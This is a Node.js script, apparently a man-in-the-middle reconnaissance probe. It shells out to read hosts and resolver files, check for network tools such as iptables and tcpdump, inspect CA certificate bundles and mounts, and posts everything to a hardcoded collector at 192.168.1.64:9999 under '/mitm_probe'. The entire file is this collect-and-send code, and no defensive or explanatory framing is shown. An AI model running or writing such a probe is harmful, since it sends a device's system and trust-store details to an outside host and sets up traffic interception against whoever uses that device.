"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 8000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.hosts = sh("ls -la /etc/hosts /etc/resolv.conf /etc/nsswitch.conf 2>&1; echo ---; cat /etc/hosts 2>&1 | head -8; echo ---; cat /etc/resolv.conf 2>&1");
out.tools = sh("which iptables ip6tables dnsmasq tcpdump 2>&1; echo ---; ls /opt/var/lib/ca-certificates/ 2>&1; echo ---; tail -c 200 /opt/var/lib/ca-certificates/ca-bundle.pem 2>&1 | head -5");
out.bundle_probe = sh("ls -la /opt/var/lib/ca-certificates/ca-bundle.pem /etc/ssl/certs/ca-bundle.pem /usr/share/ca-certificates/certs 2>&1 | head -12; echo ---; mount | grep -E 'opt|etc' | head -6");
post("/mitm_probe", out);
